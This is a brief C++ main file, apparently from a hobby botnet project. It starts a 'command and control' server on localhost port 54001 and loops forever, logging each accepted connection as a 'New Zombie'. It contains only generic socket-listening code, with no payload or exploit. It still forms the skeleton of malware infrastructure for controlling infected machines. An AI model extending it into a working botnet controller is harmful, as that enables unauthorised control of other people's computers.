#include <iostream>

#include "Server.h"

int main()
{
	std::cout << "Init CanC" << std::endl;
	Server CandC("127.0.0.1", 54001);

	if (!CandC.init())
		return 0;

	if (CandC.createListeningSocket())
	{
		while (true)
		{
			if (CandC.waitForConnection())
			{
				std::cout << "New Zombie" << std::endl;
			}
			else
			{
				std::cout << "couldnt accept Zombie" << std::endl;
			}
		}
	}
	else
	{
		std::cout << "couldnt create server socket" << std::endl;
	}

	std::cin.get();
	return 0;
}